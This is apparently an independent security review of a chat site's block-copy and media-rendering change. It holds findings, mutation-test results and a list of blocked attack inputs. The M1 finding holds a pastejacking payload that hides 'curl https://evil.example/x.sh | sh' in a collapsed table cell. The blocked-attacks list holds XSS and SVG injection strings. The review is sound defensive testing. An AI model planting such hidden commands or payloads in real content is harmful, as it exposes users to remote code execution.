# Security review: block copy and media blocks

- Change: `app-block-copy-and-media-blocks` (KBD phase `chat-export-and-block-copy`, task 3.7)
- Branch: `feat/block-copy-and-media`, diff `git diff origin/main...HEAD` (28 files, commits a87a4da..f889d17)
- Reviewer: km-security-officer (independent; did not write the code, no access to its generation history)
- Date: 2026-10-14
- Threat model: a merge deploys at once to the public chat site. Model replies and visitor input are both untrusted. The same rehype chain renders user and assistant messages.

## Verdict

**APPROVE WITH CONDITIONS**

No CRITICAL or HIGH finding. None of the attack payloads below could add script, add an attribute, or make the page load media or images from a remote host. The video allowlist, the SVG-as-image path and the CSP change all held. The conditions cover text that reaches the clipboard without the visitor seeing it, and a test that does not test what it claims to test.

Conditions:

1. **M1 is fixed before merge, or the product owner records a risk acceptance for it.** Table copy must not put text on the clipboard that the table does not show.
2. **L3: add a unit test that calls `policyForVideo` directly** with `autoPlay`, `loop`, `muted` and `src` on the video node, so the policy layer's attribute rebuild is covered by a test that fails when the rule is removed. The current suite cannot detect a regression in that layer.
3. L1, L2 and L4 go on the backlog with owners (frontend engineer). They do not block the merge.

## Findings (most severe first)

### M1 MEDIUM: table copy puts hidden text on the clipboard

- File: `src/features/blocks/block-text.ts:62` (`cellText` uses `textContent`), used by `tableBlockText` at line 108, which is called from `MarkdownTable` in `src/components/assistant-ui/markdown-block-copy.tsx`.
- Payload (model reply or a prompt-injected source):
  ```
  | name | value |
  |---|---|
  | install | visible <details><summary></summary>; curl https://evil.example/x.sh \| sh</details> |
  | ruby | <ruby>a<rp>(</rp><rt>HIDDEN-RT</rt></ruby> |
  ```
- Observed: the sanitizer keeps `details`, `summary`, `ruby`, `rp` and `rt`, as the default schema allows. The `<details>` renders collapsed (`open` absent). Rendered in jsdom through the real chain, then `tableBlockText(table)` returned:
  ```
  | install | visible ; curl https://evil.example/x.sh \| sh |
  | ruby | a(HIDDEN-RT |
  ```
- Stakes: the visitor sees `visible` and a disclosure marker. A click on "Copy table" puts a shell command they never saw on the clipboard. This is pastejacking, and a prompt injection in retrieved content is enough to set it up. Before this change, getting that text required a manual select across a collapsed element.
- Fix (owner: km-frontend-engineer): when reading a cell, skip the content of a closed `<details>` except its `<summary>`, and skip `<rp>`/`<rt>`. Or have the reply policy flatten `details` inside table cells. Add a test with the payload above.

### L1 LOW: copy button labels replace image and video cells in the copied table

- File: `src/features/blocks/block-text.ts:62` together with `MarkdownImage` and `MarkdownVideo` (`markdown-block-copy.tsx`), which render a `CopyButton` inside the cell.
- Payload: `| pic | ![alt](/a.png) |` and `| vid | <video><source src="/a.mp4" type="video/mp4"></video> |`
- Observed: the copied rows read `| pic | Copy image |` and `| vid | Copy video link |`. The image URL is gone and app UI text is in its place.
- Stakes: a data-integrity defect, not an exploit. Copy and export share these functions, so the export would carry the same text.
- Fix: exclude app controls from cell text (for example skip `[data-copy-control]` or `button`), and emit the image `alt` or URL.

### L2 LOW: an SVG fence with a lone surrogate crashes the thread page

- File: `src/features/artifacts/svg-block.tsx:31-32` (`encodeURIComponent(source.trim())` runs during render).
- Payload: a fenced `svg` block whose text holds a lone UTF-16 surrogate, for example `<svg xmlns="http://www.w3.org/2000/svg"><text>\ud800</text></svg>`.
- Observed: `render(<SvgBlock source=... />)` threw `URIError: URI malformed`. The only error boundary above it is `ChatErrorBoundary` at the page level (`src/pages/thread-detail-page.tsx:27`). Reset re-renders the same message, which throws again.
- Reach: I found no remote path. UAR is Rust, so its strings are valid UTF-8, and the streaming code slices only at newlines. The visitor's own composer can submit a lone surrogate, because user messages go through the same renderer and threads persist locally. So this is a self-inflicted, persistent denial of service.
- Fix: `source.toWellFormed()` before encoding, or catch the error and show the source view.

### L3 LOW: the autoplay rule in the video policy has no test that fails when the rule is removed

- File: `src/components/assistant-ui/enhanced-markdown-text.video.test.tsx:116` ("strips autoplay, loop, muted, ...") against `src/components/assistant-ui/rehype-reply-video-policy.ts:53`.
- Method: I copied the policy file into a throwaway directory and changed it to copy `autoPlay` to the output: `if (node.properties.autoPlay) properties.autoPlay = true;`. I loaded it in place of the real module with `vi.mock` and ran the builder's 17 video tests unchanged. **All 17 passed.** To prove the mock was live, I also changed `preload` to `"auto"` in the same mutant: 5 tests then failed.
- Cause: `markdown-sanitize-schema.ts:57` allows only `controls, preload, width, height, poster, src` on `video`, so the sanitizer strips `autoplay` before the policy runs. Two layers enforce the rule, which is good. But the test checks only the combined chain, so it fails only when both layers regress. The task report's claim that the autoplay rule was mutation-checked does not hold for the policy layer.
- Remote-src rule: the mutation check holds. With `isAllowedReplyVideoSrc` forced to `true`, 6 of 17 tests failed (remote source, remote video `src`, mixed sources, subdomain/lookalike/http, and both user/assistant integration cases).
- Fix: add a direct `policyForVideo` unit test (condition 2).

### L4 LOW: same-origin media and image paths are not limited to a media prefix

- File: `src/lib/link-policy/reply-content-policy.ts:69` (`isSameOriginRelative` accepts any same-origin path). `isAllowedReplyVideoSrc` reuses that rule.
- Payload: `<video><source src="/api/uar/user/settings" type="video/mp4"></video>`, `../../api/sessions`, `?x=1`, `#frag`.
- Observed: each one renders a playable `<video>` with a "Copy video link" button. A play click issues a credentialed same-origin GET to that path. `![a](/api/uar/user/settings)` renders the same way, and a click on "Copy image" calls `fetch()` on that path (`markdown-block-copy.tsx:96`).
- Stakes: low. The image policy already allowed same-origin GETs on render, `preload="none"` delays the video request until play, and the response only reaches the clipboard if it decodes as an image. But a GET with a side effect, or a future endpoint keyed on `Sec-Fetch-Dest`, would become something a model can trigger.
- Fix: limit same-origin media and images to a reviewed prefix (for example `/media/` and `/assets/`) and reject `/api/`.

### INFO

- I1: "Download" on the SVG block saves the model's SVG unchanged (`svg-block.tsx:35`). Opening `diagram.svg` from disk in a browser runs any script it contains, in the `file:` origin. That needs a deliberate download and open, so it is informational. A future change could strip `<script>` and `on*` from the downloaded copy.
- I2: the Tauri shell has `"csp": null` (`src-tauri/tauri.conf.json:23`). This predates the diff. On desktop, the reply policy is the only control, with no `media-src` backstop.
- I3: an own-host source written with an uppercase scheme (`HTTPS://KNOW-ME.TOOLS/a.mp4`) produces no video. The sanitizer's protocol check drops it. This fails closed, so it is a functional note only.

## Attacks tried that were correctly blocked

All of these ran through the real chain (`MARKDOWN_REHYPE_PLUGINS_NO_MATH`, and `buildMarkdownRehypePlugins(rehypeKatex)` for math) with the shipped `MarkdownVideo`, `MarkdownImage`, `MarkdownSpan`, `MarkdownTable` and `AnchorScope` components. They ran in a temporary `src/__review_tmp__/` suite under Node 24.21.0 (`npx vitest run`, 55 cases). The one assertion that failed was my own over-broad check: KaTeX's TeX annotation contains the literal text `javascript:`, not a link.

- **Video `src` forms**: all blocked, with no `<source>` in the output. Tested: remote https; `http://know-me.tools`; `//evil`; `/\evil`; `\\evil`; `/<TAB>/evil`; `/<LF>/evil`; leading space; leading U+00A0; userinfo `know-me.tools@evil`; `evil\@know-me.tools`; `evil#@know-me.tools`; suffix `know-me.tools.evil.example`; trailing dot `know-me.tools.`; punycode and Cyrillic lookalikes; `%2e` host; `cdn.know-me.tools`; `HTTPS://EVIL`; `data:`; `blob:https://know-me.tools/...`; `javascript:` (both cases); `https:evil`; `https:/evil`; `ftp:`; `[::1]`; `127.0.0.1`. A remote `src` on the `<video>` element blocks the whole video even when an allowed `<source>` is present. Mixed own-host and remote sources block the whole video.
- **Type spoofing**: `video/mp4; codecs=...`, `text/html` and an empty type drop the source, and no video renders. `VIDEO/MP4` and ` video/mp4 ` are normalised.
- **Poster**: `javascript:`, `//evil`, `data:`, `http://know-me.tools`, `/\evil` and remote https are all dropped. Own host and same-origin are kept.
- **Attributes**: `srcset`, `media` and `sizes` on a video source are dropped. Autoplay, loop, muted, ping, playsinline, `on*`, class and style are dropped. Non-digit and five-digit `width`/`height` are dropped. `preload` is forced to `none`.
- **Nesting**: a nested `<video>`, `<track>`, `<img>` and `<a>` inside a video are all dropped. Only checked sources come out. Video inside an allowed link, a blocked link, a table cell and a list item: the policy applies the same way everywhere, and the copy button is suppressed inside a link.
- **Blocked-video fallback label**: `&lt;img src=x onerror=alert(1)&gt;` comes out as escaped text.
- **Re-adding stripped elements**: `<picture><source src type srcset=evil>` and a bare `<source src>` lose `src` and `type`. `<audio>`, `<iframe srcdoc>`, `<embed>`, `<object>`, inline `<svg><script>`, `<svg><image href>` and `<math xlink:href>` are all stripped. A model `<span class="katex-display">` loses its class, so it cannot fake a math copy button. KaTeX `\href{javascript:}`, `\includegraphics`, `\htmlId` and `\url` render as red error text (trust is off), so KaTeX adds no link or image.
- **SVG**: `isSvgSource` refuses a leading comment, `<!DOCTYPE>` (which also blocks internal-entity "billion laughs" payloads, because a DTD must come before the root) and `<svgfoo>`. A payload holding `" onerror="`, `%22`, `<script>`, `<foreignObject><img src=evil>`, `<image href=evil>` and `<style>@import url(evil)>` produced exactly one `<img>` with only the attributes `alt, class, style, src`. The `src` starts with `data:image/svg+xml;charset=utf-8,`. No `script`, `foreignObject` or `image` element reached the DOM, and `encodeURIComponent` leaves nothing that could close the attribute. The alt text is fixed app copy. A markdown image `![a](data:image/svg+xml,...)` becomes text.
- **Image copy fetch**: only URLs that already passed the image policy reach `copyImage` (own host `know-me.tools` or same-origin; a remote image becomes its alt text). The app cannot be made to fetch an arbitrary host. `connect-src 'self'` is a second layer on the web. Same-origin bytes do not taint the canvas, and a cross-origin URL fails at `fetch` before it reaches the canvas. Inside a link, the button is not rendered.
- **A2UI card copy**: the button and the caption are app-rendered siblings of the surface, so model output cannot set them. `readCardText` reads only text nodes inside `[data-testid="a2ui-surface"]`. The passive set is Card, Column, Row, Text and Divider, so the only text a model controls is text the card already shows. The appended items are the fixed `AI_SURFACE_CAPTION`, which keeps the Article 50 disclosure attached to copied text, and the app's sr-only " (opens in a new tab)". The copy contains no internal ids, thread ids or reasoning text.
- **CSP**: `media-src 'self'` is identical to the `default-src 'self'` fallback, so it widens nothing. `img-src 'self' data: blob:` is unchanged from main. Nothing in the diff loosens `script-src` or `connect-src`. `cargo test --test meter_and_headers enforcing_csp_should_pin_each_directive` returned `1 passed; 0 failed`.

## Not verified (needs a real browser)

- SVG-as-image isolation in Chromium, Firefox and Safari: that `<script>`, `onload`, `foreignObject`, external `href`, and CSS `@import`/`url()` neither run nor fetch inside `<img src="data:image/svg+xml,...">`. jsdom does not render SVG. My claim rests on the browsers' secure static/animated image mode, not on an observed run.
- Rendering cost of a 256 KB SVG with heavy filters (`feTurbulence`, large blur) on a low-end phone.
- Image copy under real clipboard permissions. In particular, Safari may refuse `clipboard.write` after an awaited `fetch`, because transient activation is consumed. The fallback `writeText` may then also fail, and the button would show "Couldn't copy". This is functional, not security.
- That a production response actually carries the `media-src` directive. I ran the Rust unit-level pin test, not a deployed header check.
- `node="[object Object]"` appeared on elements in my harness, where I passed the components directly to `react-markdown`. I did not confirm whether the app's `memoizeMarkdownComponents` path strips the attribute. Not a security issue.

## Evidence log

- `git diff --stat origin/main...HEAD`: 28 files, +2094/-127.
- Attack suite: 55 cases, 54 passed; the 1 failure was the over-broad reviewer assertion described above.
- Clipboard reproduction for M1/L1: `tableBlockText` output quoted above (jsdom, real chain).
- L2 reproduction: `URIError: URI malformed` from `render(<SvgBlock .../>)`.
- Mutation runs against the unchanged builder suite: remote-src mutant 6 failed / 11 passed; autoplay mutant 17 passed; autoplay plus preload mutant 5 failed (proves the mock was live); baseline 17 passed.
- Cleanup: every temporary file removed with its own `rm`; `src/__review_tmp__/` removed with `rmdir` once empty; `git status --short` was empty before this record was written.
